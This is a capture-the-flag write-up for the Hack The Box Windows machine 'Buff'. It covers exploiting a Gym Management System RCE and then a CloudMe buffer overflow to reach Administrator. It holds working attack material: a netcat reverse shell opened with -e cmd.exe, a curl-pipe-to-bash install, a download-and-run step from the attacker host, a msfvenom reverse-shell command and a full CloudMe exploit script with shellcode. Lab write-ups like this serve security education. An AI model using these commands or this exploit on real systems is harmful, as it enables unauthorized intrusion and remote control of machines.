---
layout: single
title: "Hack The Box Write-up #6 : Buff"
excerpt: "Writeup for Buff, a windows machine provided by HacktheBox."
date: 2020-11-22
categories:
  - hackthebox
tags:  
  - windows
  - cve
  - rce
  - buffer-overflow
  - CloudMe
author_profile: true
---

![card](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/buff.png)

## Summary
Buff is an easy Windows machine provided by egotisticalSW on hackthebox. 
We are provided with a vulnerable **Gym Management System** for the initial Foothold where we use a RCE vulnerability to gain a low-privileged shell. 
For root We exploit a target (**CloudMe**) which is vulnerable to Buffer Overflow.

## Enumeration
Using our very first usual information , which is the machine's IP (**10.10.10.198**) , we begin to enumerate with a **nmap** scan
### nmap

```sh
root@kali:~# nmap -sC -sV -T4 10.10.10.198
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-22 15:46 CET
Nmap scan report for 10.10.10.198
Host is up (0.078s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
```
Only port **8080** shows opened which appears to be a WebServer holding the title : **mrb3n's Bro Hut**.

### Webpage

The website represents somewhat of a fitness page with a login option.

![webpage](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/webpage.png)

Clicking on **Contact** button reveals useful information.           
The website has been built using ``Gym Management Software 1.0``

![contact](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/contact.png)

### Gaining a low-privileged shell

While searching the software on **exploitdb** We find a RCE vulnerability ...

![exploitdb](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/exploitdb.png)

I am going to use the 4th exploit which appears to be an ``Unauthenticated Remote Code Execution`` Vulnerability.

```sh
root@kali:~# searchsploit -m /usr/share/exploitdb/exploits/php/webapps48506.py
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48506
     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/48506.py


root@kali:~# python 48506.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
�
buff\shaun
```

I have gained an initial shell which is somewhat unstable and not very helpful for lateral movement so I'm going to upload netcat and grab myself a stable shell.

### Upgrading to a stable shell

```sh
root@kali:/usr/share/windows-resources/binaries# python3 -m http.server 80
```

Using python3 **http.server** I can host a copy of netcat.exe which is located on ``/usr/share/windows-binaries/nc.exe`` on any Kali host.

On the remote machine I can use the following commands to download and execute netcat in order to give myself a reverse shell :

```
C:\xampp\htdocs\gym\upload> powershell -c "curl.exe http://10.10.14.127/nc.exe -o netcat.exe" 
C:\xampp\htdocs\gym\upload> netcat.exe 10.10.14.127 9001 -e cmd.exe
```

After a while listening , I recieve a reverse shell:

![rev](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/rev.png)

## Lateral Movement

While enumerating the box I came across an interesting **.exe** file under ``C:\Users\shaun\Downloads`` :

```
C:\Users\shaun\Documents>cd ../Downloads
cd ../Downloads

C:\Users\shaun\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   9,756,262,400 bytes free
```

Again , searching the software on **exploitdb** for a possible vulnerability leads to this :

![cloudme](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/cloudme.png)

By the first view, it seems like a **Buffer Overflow** vulnerability laying on **CloudMe** which should probably be listening on a local port on the machine. 

We can confirm that by executing this command :

```
C:\Users\shaun\Downloads>netstat -an | findstr "LISTENING"

  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
  [...]
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING
  TCP    [::]:135               [::]:0                 LISTENING
  TCP    [::]:445               [::]:0                 LISTENING
  [...]
```

It appears that the vulnerable software is listening under port **8888** on ``localhost``. 

### Tunneling

To remotely exploit it, We would need to use a software like **chisel** to forward the port on our own host and be able to start attacking.

I'm going to download chisel.exe from [here](https://github.com/jpillora/chisel/releases/tag/v1.7.3) and upload on the target machine the same way I used to download netcat.

You would also need to install **chisel** on your attacking machine by doing so : 
```sh
root@kali:~# curl https://i.jpillora.com/chisel! | bash
```
To initiate a chisel server and forward the local port on our host I'll use the following command in kali , where **chisel** will act as a server : 
```sh
root@kali:~# chisel server -p 9999 --reverse
2020/11/22 16:57:19 server: Reverse tunnelling enabled
2020/11/22 16:57:19 server: Fingerprint a63KtuIHgw77NOvEkBiELKD5r+XZqaveL6gaGH1SMdg=
2020/11/22 16:57:19 server: Listening on http://0.0.0.0:9999
```
Next, on the target machine where **chisel** will act as a client I'll fire the following command :
```
C:\xampp\htdocs\gym\upload>chisel.exe client 10.10.14.127:9999 R:8888:127.0.0.1:8888
2020/11/22 16:07:14 client: Connecting to ws://10.10.14.127:9999
2020/11/22 16:07:14 client: Fingerprint 3e:9b:22:0a:bc:86:88:37:da:bc:fe:ff:13:89:a9:20
2020/11/22 16:07:15 client: Connected (Latency 512.4523ms)
```
With everything already set-up now, We can try to attack the vulnerable software. 

I'm going to use the exploit from [https://www.exploit-db.com/exploits/48389](https://www.exploit-db.com/exploits/48389) which requires some modifications such as changing the shellcode in order to match with our listening port and ip.

### Exploiting the vulnerable software

Using ``searchsploit -m`` we can again copy the exploit to a more flexible path :

![bof](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/bof.png)

### Generating the shellcode

To generate the shellcode I can use **msfvenom** with the following options: 
```sh
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.127 LPORT=9002 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xbb\xc4\x1c\x1b\x3a\xda\xda\xd9\x74\x24\xf4\x5a\x29"
[...]
```

Lastly, Im going to replace the shellcode in the exploit with the one I just generated. 

The final exploit code should look something like this :

```python
import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

payload  = b""
payload += b"\xbb\xc4\x1c\x1b\x3a\xda\xda\xd9\x74\x24\xf4\x5a\x29"
payload += b"\xc9\xb1\x52\x31\x5a\x12\x83\xea\xfc\x03\x9e\x12\xf9"
payload += b"\xcf\xe2\xc3\x7f\x2f\x1a\x14\xe0\xb9\xff\x25\x20\xdd"
payload += b"\x74\x15\x90\x95\xd8\x9a\x5b\xfb\xc8\x29\x29\xd4\xff"
payload += b"\x9a\x84\x02\xce\x1b\xb4\x77\x51\x98\xc7\xab\xb1\xa1"
payload += b"\x07\xbe\xb0\xe6\x7a\x33\xe0\xbf\xf1\xe6\x14\xcb\x4c"
payload += b"\x3b\x9f\x87\x41\x3b\x7c\x5f\x63\x6a\xd3\xeb\x3a\xac"
payload += b"\xd2\x38\x37\xe5\xcc\x5d\x72\xbf\x67\x95\x08\x3e\xa1"
payload += b"\xe7\xf1\xed\x8c\xc7\x03\xef\xc9\xe0\xfb\x9a\x23\x13"
payload += b"\x81\x9c\xf0\x69\x5d\x28\xe2\xca\x16\x8a\xce\xeb\xfb"
payload += b"\x4d\x85\xe0\xb0\x1a\xc1\xe4\x47\xce\x7a\x10\xc3\xf1"
payload += b"\xac\x90\x97\xd5\x68\xf8\x4c\x77\x29\xa4\x23\x88\x29"
payload += b"\x07\x9b\x2c\x22\xaa\xc8\x5c\x69\xa3\x3d\x6d\x91\x33"
payload += b"\x2a\xe6\xe2\x01\xf5\x5c\x6c\x2a\x7e\x7b\x6b\x4d\x55"
payload += b"\x3b\xe3\xb0\x56\x3c\x2a\x77\x02\x6c\x44\x5e\x2b\xe7"
payload += b"\x94\x5f\xfe\xa8\xc4\xcf\x51\x09\xb4\xaf\x01\xe1\xde"
payload += b"\x3f\x7d\x11\xe1\x95\x16\xb8\x18\x7e\x13\x37\x2c\x01"
payload += b"\x4b\x45\x30\xde\xa1\xc0\xd6\x4a\xa6\x84\x41\xe3\x5f"
payload += b"\x8d\x19\x92\xa0\x1b\x64\x94\x2b\xa8\x99\x5b\xdc\xc5"
payload += b"\x89\x0c\x2c\x90\xf3\x9b\x33\x0e\x9b\x40\xa1\xd5\x5b"
payload += b"\x0e\xda\x41\x0c\x47\x2c\x98\xd8\x75\x17\x32\xfe\x87"
payload += b"\xc1\x7d\xba\x53\x32\x83\x43\x11\x0e\xa7\x53\xef\x8f"
payload += b"\xe3\x07\xbf\xd9\xbd\xf1\x79\xb0\x0f\xab\xd3\x6f\xc6"
payload += b"\x3b\xa5\x43\xd9\x3d\xaa\x89\xaf\xa1\x1b\x64\xf6\xde"
payload += b"\x94\xe0\xfe\xa7\xc8\x90\x01\x72\x49\xb0\xe3\x56\xa4"
payload += b"\x59\xba\x33\x05\x04\x3d\xee\x4a\x31\xbe\x1a\x33\xc6"
payload += b"\xde\x6f\x36\x82\x58\x9c\x4a\x9b\x0c\xa2\xf9\x9c\x04"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))       

buf = padding1 + EIP + NOPS + payload + overrun 

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
```

### Gaining system-shell

Im going to save the modified exploit and run it using : 
``python cloudme_exploit.py``. 

Before executing remember that we also need to set up a listening port (the same we used while generating a shellcode) , in this case it would be **9002**

![admin](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/admin.png)

After executing I recieved a shell as **Administrator** which was pretty much the last step for this box.
